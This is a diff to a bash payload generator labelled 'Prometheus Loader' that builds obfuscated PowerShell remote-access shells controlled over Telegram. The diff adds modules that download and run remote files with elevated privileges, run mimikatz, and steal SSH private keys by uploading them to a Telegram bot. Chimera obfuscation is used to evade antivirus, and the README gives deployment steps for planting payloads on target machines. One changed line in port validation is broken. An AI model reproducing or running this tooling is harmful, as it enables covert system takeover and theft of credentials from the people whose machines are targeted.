@@ -1,8 +1,8 @@
 #!/bin/bash
 # File: pmtgener
-# PMTgenerator V1.0 - Unified Payload Generator for Prometheus Loader
+# PMTgenerator V1.1 - Unified Payload Generator for Prometheus Loader
 
-VERSION="1.0"
+VERSION="1.1"
 SCRIPT_NAME="pmtgener"
 AUTHOR="Prometheus Loader Team"
 
@@ -15,6 +15,8 @@ LPORT=""
 TOKEN=""
 ID=""
 CHIMERA_SCRIPT="./chimera.sh"
+CLOUD_MODULE=0
+DUMPER_MODULE=0
 
 # Colors for output
 RED='\033[0;31m'
@@ -83,13 +85,15 @@ show_help() {
     echo "TELEGRAM SHELLS OPTIONS (for better_tg and tg_shell):"
     echo "  --token TOKEN        HTTP token for telegram bot"
     echo "  --id ID              Telegram user ID for bot access control"
+    echo "  --cloud-module       Add cloud download module (Google Cloud, Dropbox, etc.)"
+    echo "  --dumper-module      Add credential dumping module (NTML hash, SSH keys)"
     echo ""
     echo "REVERSE SHELLS OPTIONS (for standart and advanced):"
     echo "  --ip IP              Your local IP in wifi network"
     echo "  --port PORT          Port for shell to connect"
     echo ""
     echo "EXAMPLES:"
-    echo "  $SCRIPT_NAME -t better_tg --token 123:ABC --id 456789"
+    echo "  $SCRIPT_NAME -t better_tg --token 123:ABC --id 456789 --cloud-module --dumper-module"
     echo "  $SCRIPT_NAME -t standart --ip 192.168.1.100 --port 4444"
     echo "  $SCRIPT_NAME -t advanced --ip 10.0.0.5 --port 9001 -EL 4 -v"
     echo ""
@@ -101,6 +105,247 @@ show_version() {
     echo "Part of Prometheus Loader - Red Team Deployment Kit"
     exit 0
 }
+
+# Cloud module PowerShell code
+CLOUD_MODULE_CODE='function Cloud-Help {
+    Send-TG -txt "Cloud module help:"
+    Send-TG -txt "/cloud [download url]"
+    Send-TG -txt "/cloud [download url] --exec"
+    Send-TG -txt "/cloud [download url] --exec-admin-priv"
+    Send-TG -txt "/cloud [download url] --exec-admin-priv [user] [password]"
+    Send-TG -txt "/cloud [download url] --check-sha256-hash"
+    Send-TG -txt "/cloud [download url] /absolute/path/to/save/file"
+    Send-TG -txt "Working with Google Cloud, Dropbox, github, yandex disk, filebin"
+}
+
+function Download-File {
+    param([string]$url, [string]$outputPath)
+    try {
+        if ($url -match "drive\.google\.com") {
+            $fileId = $url -replace "^.*/d/([^/]+).*$", "`$1"
+            $url = "https://drive.google.com/uc?export=download&id=$fileId"
+        } elseif ($url -match "dropbox\.com") {
+            $url = $url -replace "www\.dropbox\.com", "dl.dropboxusercontent.com"
+        } elseif ($url -match "github\.com") {
+            $url = $url -replace "github\.com", "raw.githubusercontent.com" -replace "/blob/", "/"
+        } elseif ($url -match "disk\.yandex\.ru") {
+            $url = $url -replace "/view/", "/public/get/"
+        }
+        
+        Invoke-WebRequest -Uri $url -OutFile $outputPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        return $true
+    } catch {
+        Send-TG -txt "Download failed: $_"
+        return $false
+    }
+}
+
+function Process-Cloud-Command {
+    param([string]$command)
+    
+    if ($command -eq "/cloud help") {
+        Cloud-Help
+        return
+    }
+    
+    $pattern = "^/cloud\s+(https?://[^\s]+)(?:\s+(--exec|--exec-admin-priv|--check-sha256-hash|/[^\s]+))?(?:\s+(.*))?$"
+    if ($command -match $pattern) {
+        $url = $matches[1]
+        $option = $matches[2]
+        $extra = $matches[3]
+        
+        $tempFile = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName()
+        
+        if (Download-File -url $url -outputPath $tempFile) {
+            $fileSize = (Get-Item $tempFile).Length
+            Send-TG -txt "File downloaded: $tempFile ($($fileSize) bytes)"
+            
+            switch ($option) {
+                "--exec" {
+                    try {
+                        $result = powershell -ExecutionPolicy Bypass -File $tempFile 2>&1 | Out-String
+                        Send-TG -txt "Execution result: $result"
+                    } catch {
+                        Send-TG -txt "Execution failed: $_"
+                    }
+                }
+                "--exec-admin-priv" {
+                    if ($extra) {
+                        $credParts = $extra -split "\s+"
+                        if ($credParts.Count -ge 2) {
+                            $user = $credParts[0]
+                            $password = $credParts[1]
+                            $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+                            $cred = New-Object System.Management.Automation.PSCredential($user, $securePass)
+                            
+                            try {
+                                Start-Process powershell.exe -Credential $cred -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`"" -NoNewWindow -Wait
+                                Send-TG -txt "Executed with admin privileges"
+                            } catch {
+                                Send-TG -txt "Admin execution failed: $_"
+                            }
+                        }
+                    } else {
+                        try {
+                            Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`"" -NoNewWindow -Wait
+                            Send-TG -txt "Executed with elevated privileges (UAC prompt)"
+                        } catch {
+                            Send-TG -txt "Elevated execution failed: $_"
+                        }
+                    }
+                }
+                "--check-sha256-hash" {
+                    $hash = Get-FileHash $tempFile -Algorithm SHA256
+                    Send-TG -txt "SHA256 hash: $($hash.Hash)"
+                }
+                {$_ -match "^/" -and $_ -ne "--exec" -and $_ -ne "--exec-admin-priv" -and $_ -ne "--check-sha256-hash"} {
+                    $targetPath = $option
+                    try {
+                        Copy-Item $tempFile $targetPath -Force
+                        Send-TG -txt "File saved to: $targetPath"
+                    } catch {
+                        Send-TG -txt "Save failed: $_"
+                    }
+                }
+                default {
+                    Send-TG -txt "File downloaded successfully. Use --exec to execute or specify save path"
+                }
+            }
+            
+            # Cleanup
+            Start-Sleep -Seconds 2
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        }
+    } else {
+        Send-TG -txt "Invalid cloud command format. Use: /cloud help"
+    }
+}'
+
+# Dumper module PowerShell code
+DUMPER_MODULE_CODE='function Dumper-Help {
+    Send-TG -txt "Dumper module help:"
+    Send-TG -txt "/dump NTML-hash (send ntml hash in message)"
+    Send-TG -txt "/dump ssh-keys (send ssh-keys as document)"
+}
+
+function Send-File-Telegram {
+    param([string]$filePath, [string]$caption)
+    try {
+        $curlCmd = "curl -X POST `"https://api.telegram.org/bot$token/sendDocument`" -F chat_id=$chatId -F document=@`"$filePath`""
+        if ($caption) {
+            $curlCmd += " -F caption=`"$caption`""
+        }
+        Invoke-Expression $curlCmd
+        return $true
+    } catch {
+        Send-TG -txt "File upload failed: $_"
+        return $false
+    }
+}
+
+function Dump-NTML-Hash {
+    try {
+        # Try to get NTML hashes using various methods
+        $hashes = @()
+        
+        # Method 1: Check SAM registry
+        if (Test-Path "HKLM:\SAM\SAM\Domains\Account\Users") {
+            Send-TG -txt "SAM registry access attempted"
+        }
+        
+        # Method 2: Use mimikatz if available
+        $mimikatzPaths = @("$env:TEMP\mimikatz.exe", "C:\Windows\System32\mimikatz.exe", "$env:USERPROFILE\Desktop\mimikatz.exe")
+        foreach ($path in $mimikatzPaths) {
+            if (Test-Path $path) {
+                $result = & $path "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1
+                $hashes += $result | Out-String
+                break
+            }
+        }
+        
+        # Method 3: Basic system info
+        if ($hashes.Count -eq 0) {
+            $users = Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Lockout, SID
+            $systemInfo = "Users on system:`n" + ($users | Out-String)
+            $hashes += $systemInfo
+        }
+        
+        $tempFile = "$env:TEMP\ntml_hashes_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+        $hashes | Out-File $tempFile -Encoding UTF8
+        Send-File-Telegram -filePath $tempFile -caption "NTML Hash Dump"
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        
+    } catch {
+        Send-TG -txt "NTML dump failed: $_"
+    }
+}
+
+function Dump-SSH-Keys {
+    try {
+        $sshFolders = @(
+            "$env:USERPROFILE\.ssh",
+            "C:\ProgramData\ssh",
+            "$env:ALLUSERSPROFILE\ssh"
+        )
+        
+        $foundKeys = @()
+        foreach ($folder in $sshFolders) {
+            if (Test-Path $folder) {
+                $keys = Get-ChildItem $folder -File -Filter "*" -ErrorAction SilentlyContinue | 
+                       Where-Object {$_.Name -match "(id_rsa|id_dsa|id_ecdsa|id_ed25519|authorized_keys|known_hosts)"}
+                foreach ($key in $keys) {
+                    $foundKeys += $key.FullName
+                }
+            }
+        }
+        
+        if ($foundKeys.Count -gt 0) {
+            $zipFile = "$env:TEMP\ssh_keys_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+            
+            # Create ZIP archive
+            $shell = New-Object -ComObject Shell.Application
+            $zipFolder = $shell.NameSpace($zipFile)
+            
+            foreach ($keyFile in $foundKeys) {
+                $zipFolder.CopyHere($keyFile)
+                Start-Sleep -Milliseconds 500
+            }
+            
+            Start-Sleep -Seconds 2
+            
+            if (Test-Path $zipFile) {
+                Send-File-Telegram -filePath $zipFile -caption "SSH Keys Dump ($($foundKeys.Count) files)"
+                Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+            }
+        } else {
+            Send-TG -txt "No SSH keys found"
+        }
+        
+    } catch {
+        Send-TG -txt "SSH keys dump failed: $_"
+    }
+}
+
+function Process-Dump-Command {
+    param([string]$command)
+    
+    if ($command -eq "/dump help") {
+        Dumper-Help
+        return
+    }
+    
+    switch -regex ($command) {
+        "^/dump\s+NTML-hash$" {
+            Dump-NTML-Hash
+        }
+        "^/dump\s+ssh-keys$" {
+            Dump-SSH-Keys
+        }
+        default {
+            Send-TG -txt "Invalid dump command. Use: /dump help"
+        }
+    }
+}'
 
 # Function to validate IP address
 validate_ip() {
@@ -190,7 +435,7 @@ check_dependencies() {
     fi
 }
 
-# Function to generate better_tg payload
+# Function to generate better_tg payload with modules
 generate_better_tg() {
     local raw_file="raw_shell_tg_$$.ps1"
     local output_file="${OUTPUT_FILE:-"crypt_shell_tg_$$.ps1"}"
@@ -201,6 +446,12 @@ generate_better_tg() {
     fi
     
     print_message "$CYAN" "Generating Advanced Telegram C2 payload..."
+    if [ $CLOUD_MODULE -eq 1 ]; then
+        print_info "Cloud module: ENABLED"
+    fi
+    if [ $DUMPER_MODULE -eq 1 ]; then
+        print_info "Dumper module: ENABLED"
+    fi
     
     # Create raw PowerShell file
     cat <<EOF > "$raw_file"
@@ -231,6 +482,10 @@ function Send-TG { param(\$txt)
     } catch {}
 }
 
+$(if [ $CLOUD_MODULE -eq 1 ]; then echo "$CLOUD_MODULE_CODE"; fi)
+
+$(if [ $DUMPER_MODULE -eq 1 ]; then echo "$DUMPER_MODULE_CODE"; fi)
+
 while(\$true){
     try {
         \$url = "https://api.telegram.org\$token/getUpdates?timeout=20&offset=\$(\$offset + 1)"
@@ -239,6 +494,19 @@ while(\$true){
             \$offset = \$u.update_id
             if(\$u.message.text) {
                 \$c = \$u.message.text
+                
+                # Check for module commands first
+                $(if [ $CLOUD_MODULE -eq 1 ]; then echo 'if ($c -match "^/cloud") {
+                    Process-Cloud-Command -command $c
+                    continue
+                }'; fi)
+                
+                $(if [ $DUMPER_MODULE -eq 1 ]; then echo 'if ($c -match "^/dump") {
+                    Process-Dump-Command -command $c
+                    continue
+                }'; fi)
+                
+                # Regular command execution
                 try {
                     \$res = (Invoke-Expression \$c 2>&1 | Out-String)
                     if ([string]::IsNullOrWhiteSpace(\$res)) { \$res = "Success (No Output)" }
@@ -275,6 +543,13 @@ EOF
         print_success "Payload generated successfully: $output_file"
         print_info "Size: $(wc -c < "$output_file") bytes"
         
+        if [ $CLOUD_MODULE -eq 1 ]; then
+            print_info "Cloud module integrated: /cloud commands available"
+        fi
+        if [ $DUMPER_MODULE -eq 1 ]; then
+            print_info "Dumper module integrated: /dump commands available"
+        fi
+        
         # Cleanup
         rm -f "$raw_file"
         if [ $VERBOSE -eq 1 ]; then
@@ -287,7 +562,133 @@ EOF
         print_info "1. Upload the payload to target system"
         print_info "2. Execute with: powershell -ExecutionPolicy Bypass -File $output_file"
         print_info "3. Send commands to your Telegram bot"
-        print_info "4. Check loader scripts for delivery methods"
+        print_info "4. Available module commands:"
+        if [ $CLOUD_MODULE -eq 1 ]; then
+            print_info "   - /cloud help - Show cloud module help"
+            print_info "   - /cloud [url] - Download from cloud services"
+        fi
+        if [ $DUMPER_MODULE -eq 1 ]; then
+            print_info "   - /dump help - Show dumper module help"
+            print_info "   - /dump NTML-hash - Dump system hashes"
+            print_info "   - /dump ssh-keys - Dump SSH keys"
+        fi
+    else
+        print_error "Failed to obfuscate payload"
+        exit 1
+    fi
+}
+
+# Function to generate basic telegram shell with modules
+generate_tg_shell() {
+    local raw_file="raw_shell_basictg_$$.ps1"
+    local output_file="${OUTPUT_FILE:-"crypt_shell_basictg_$$.ps1"}"
+    
+    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
+        print_error "Token and ID are required for Telegram payloads"
+        exit 1
+    fi
+    
+    print_message "$CYAN" "Generating Basic Telegram Shell payload..."
+    if [ $CLOUD_MODULE -eq 1 ]; then
+        print_info "Cloud module: ENABLED"
+    fi
+    if [ $DUMPER_MODULE -eq 1 ]; then
+        print_info "Dumper module: ENABLED"
+    fi
+    
+    # Create raw PowerShell file
+    cat <<EOF > "$raw_file"
+\$token='$TOKEN'
+\$chatId='$ID'
+\$offset=0
+
+function Send-TG { param(\$txt)
+    try {
+        \$body = @{ chat_id=\$chatId; text="\$txt" }
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body \$body
+    } catch {}
+}
+
+$(if [ $CLOUD_MODULE -eq 1 ]; then echo "$CLOUD_MODULE_CODE"; fi)
+
+$(if [ $DUMPER_MODULE -eq 1 ]; then echo "$DUMPER_MODULE_CODE"; fi)
+
+while(\$true){
+try{
+\$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/getUpdates?timeout=5&offset=\$((\$offset + 1))"
+foreach(\$update in \$updates.result){
+\$offset=\$update.update_id
+if(\$update.message.text){
+\$msg=\$update.message.text
+
+# Check for module commands
+$(if [ $CLOUD_MODULE -eq 1 ]; then echo 'if ($msg -match "^/cloud") {
+    Process-Cloud-Command -command $msg
+    continue
+}'; fi)
+
+$(if [ $DUMPER_MODULE -eq 1 ]; then echo 'if ($msg -match "^/dump") {
+    Process-Dump-Command -command $msg
+    continue
+}'; fi)
+
+# Regular command execution
+try{
+\$result=Invoke-Expression \$msg 2>&1 | Out-String
+Send-TG -txt "\$result"
+}catch{
+Send-TG -txt "Error: \$_"
+}
+}
+}
+}catch{}
+Start-Sleep -Seconds 1
+}
+EOF
+    
+    if [ $VERBOSE -eq 1 ]; then
+        print_info "Created raw payload file: $raw_file"
+    fi
+    
+    # Obfuscate with Chimera
+    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
+    
+    if [ $VERBOSE -eq 1 ]; then
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
+    else
+        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
+    fi
+    
+    if [ $? -eq 0 ]; then
+        print_success "Payload generated successfully: $output_file"
+        print_info "Size: $(wc -c < "$output_file") bytes"
+        
+        if [ $CLOUD_MODULE -eq 1 ]; then
+            print_info "Cloud module integrated: /cloud commands available"
+        fi
+        if [ $DUMPER_MODULE -eq 1 ]; then
+            print_info "Dumper module integrated: /dump commands available"
+        fi
+        
+        # Cleanup
+        rm -f "$raw_file"
+        if [ $VERBOSE -eq 1 ]; then
+            print_info "Cleaned up temporary file: $raw_file"
+        fi
+        
+        # Show usage instructions
+        echo ""
+        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
+        print_info "1. Simple Telegram C2 without advanced features"
+        print_info "2. Send commands directly to your bot"
+        print_info "3. Results will be sent back via Telegram"
+        print_info "4. Module commands available:"
+        if [ $CLOUD_MODULE -eq 1 ]; then
+            print_info "   - /cloud help - Cloud download module"
+        fi
+        if [ $DUMPER_MODULE -eq 1 ]; then
+            print_info "   - /dump help - Credential dumping module"
+        fi
     else
         print_error "Failed to obfuscate payload"
         exit 1
@@ -399,7 +800,7 @@ generate_advanced() {
         exit 1
     fi
     
-    if ! validate_port "$LPORT"; then
+    if ! validate_port "$LPORT" ]; then
         print_error "Invalid port: $LPORT"
         exit 1
     fi
@@ -484,79 +885,6 @@ EOF
     fi
 }
 
-# Function to generate basic telegram shell
-generate_tg_shell() {
-    local raw_file="raw_shell_basictg_$$.ps1"
-    local output_file="${OUTPUT_FILE:-"crypt_shell_basictg_$$.ps1"}"
-    
-    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
-        print_error "Token and ID are required for Telegram payloads"
-        exit 1
-    fi
-    
-    print_message "$CYAN" "Generating Basic Telegram Shell payload..."
-    
-    # Create raw PowerShell file
-    cat <<EOF > "$raw_file"
-# \$token='$TOKEN'
-\$chatId='$ID'
-\$offset=0
-while(\$true){
-try{
-\$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/getUpdates?timeout=5&offset=\$((\$offset + 1))"
-foreach(\$update in \$updates.result){
-\$offset=\$update.update_id
-if(\$update.message.text){
-\$msg=\$update.message.text
-Set-Clipboard -Value \$msg
-try{
-\$result=Invoke-Expression \$msg 2>&1 | Out-String
-Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body @{chat_id=\$chatId; text="\$result"}
-}catch{
-Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body @{chat_id=\$chatId; text="Error: \$_"}
-}
-}
-}
-}catch{}
-Start-Sleep -Seconds 1
-}
-EOF
-    
-    if [ $VERBOSE -eq 1 ]; then
-        print_info "Created raw payload file: $raw_file"
-    fi
-    
-    # Obfuscate with Chimera
-    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
-    
-    if [ $VERBOSE -eq 1 ]; then
-        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
-    else
-        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
-    fi
-    
-    if [ $? -eq 0 ]; then
-        print_success "Payload generated successfully: $output_file"
-        print_info "Size: $(wc -c < "$output_file") bytes"
-        
-        # Cleanup
-        rm -f "$raw_file"
-        if [ $VERBOSE -eq 1 ]; then
-            print_info "Cleaned up temporary file: $raw_file"
-        fi
-        
-        # Show usage instructions
-        echo ""
-        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
-        print_info "1. Simple Telegram C2 without advanced features"
-        print_info "2. Send commands directly to your bot"
-        print_info "3. Results will be sent back via Telegram"
-    else
-        print_error "Failed to obfuscate payload"
-        exit 1
-    fi
-}
-
 # Function to list available payload types
 list_payload_types() {
     print_message "$BLUE" "Available Payload Types:"
@@ -621,6 +949,14 @@ main() {
                 ID="$2"
                 shift 2
                 ;;
+            --cloud-module)
+                CLOUD_MODULE=1
+                shift
+                ;;
+            --dumper-module)
+                DUMPER_MODULE=1
+                shift
+                ;;
             --list-types)
                 list_payload_types
                 ;;
@@ -643,6 +979,14 @@ main() {
         echo ""
         list_payload_types
         exit 1
+    fi
+    
+    # Check if modules are used with Telegram payloads only
+    if [ $CLOUD_MODULE -eq 1 ] || [ $DUMPER_MODULE -eq 1 ]; then
+        if [[ ! "$PAYLOAD_TYPE" =~ ^(better_tg|tg_shell)$ ]]; then
+            print_error "Cloud and Dumper modules are only available for Telegram payloads (better_tg, tg_shell)"
+            exit 1
+        fi
     fi
     
     # Check dependencies
@@ -681,10 +1025,15 @@ main() {
 # Create README file
 create_readme() {
     cat <<EOF > README_PMTGENER.md
-# PMTgenerator - Prometheus Loader Payload Generator
+# PMTgenerator V1.1 - Prometheus Loader Payload Generator
 
 ## Overview
-Unified CLI tool for generating obfuscated PowerShell payloads for red team operations.
+Unified CLI tool for generating obfuscated PowerShell payloads for red team operations with module support.
+
+## New Features in V1.1
+- **Cloud Module**: Download and execute files from cloud services
+- **Dumper Module**: Extract credentials and SSH keys
+- Module-based architecture for extensibility
 
 ## Installation
 1. Make the script executable:
@@ -704,9 +1053,9 @@ Unified CLI tool for generating obfuscated PowerShell payloads for red team oper
 
 ## Usage Examples
 
-### Telegram C2 (Advanced)
+### Telegram C2 with All Modules
 \`\`\`bash
-./pmtgener -t better_tg --token "123456:ABC-DEF1234" --id 987654321
+./pmtgener -t better_tg --token "123456:ABC-DEF1234" --id 987654321 --cloud-module --dumper-module
 \`\`\`
 
 ### Standard Reverse Shell
@@ -714,29 +1063,43 @@ Unified CLI tool for generating obfuscated PowerShell payloads for red team oper
 ./pmtgener -t standart --ip 192.168.1.100 --port 4444 -EL 4
 \`\`\`
 
-### Advanced Reverse Shell with Auto-Detected IP
+### Basic Telegram Shell with Cloud Module Only
 \`\`\`bash
-./pmtgener -t advanced --port 9001 -v
+./pmtgener -t tg_shell --token "123456:ABC-DEF1234" --id 987654321 --cloud-module --output malicious.ps1
 \`\`\`
 
-### Basic Telegram Shell
-\`\`\`bash
-./pmtgener -t tg_shell --token "123456:ABC-DEF1234" --id 987654321 --output malicious.ps1
-\`\`\`
+## Module Commands
+
+### Cloud Module
+Available when using \`--cloud-module\` flag:
+- \`/cloud help\` - Show cloud module help
+- \`/cloud [url]\` - Download file from URL
+- \`/cloud [url] --exec\` - Download and execute
+- \`/cloud [url] --exec-admin-priv\` - Execute with admin privileges
+- \`/cloud [url] --check-sha256-hash\` - Verify file hash
+- \`/cloud [url] /path/to/save\` - Save to specific location
+
+Supported services: Google Drive, Dropbox, GitHub, Yandex Disk, Filebin
+
+### Dumper Module
+Available when using \`--dumper-module\` flag:
+- \`/dump help\` - Show dumper module help
+- \`/dump NTML-hash\` - Extract and send NTML hashes
+- \`/dump ssh-keys\` - Extract and send SSH keys
 
 ## Features
 - Unified interface for all payload types
+- Module-based extensibility
 - Automatic IP detection
 - Chimera obfuscation integration
 - Multiple encryption levels (0-5)
-- Verbose mode for debugging
 - Clean temporary file management
 
 ## Payload Types
-1. **better_tg** - Advanced Telegram C2 with persistence and error handling
+1. **better_tg** - Advanced Telegram C2 with persistence and module support
 2. **standart** - Classic PowerShell reverse shell
 3. **advanced** - Reverse shell with stealth and persistence features
-4. **tg_shell** - Basic Telegram command execution
+4. **tg_shell** - Basic Telegram command execution with module support
 
 ## Delivery Methods
 Use the provided Ducky Scripts:
@@ -746,6 +1109,7 @@ Use the provided Ducky Scripts:
 Replace "ENTERURLHERE" in loader scripts with your payload URL.
 
 ## Notes
+- Cloud and Dumper modules only work with Telegram payloads
 - Always test payloads in controlled environments
 - Use appropriate encryption levels based on target AV
 - Telegram tokens should be kept secure
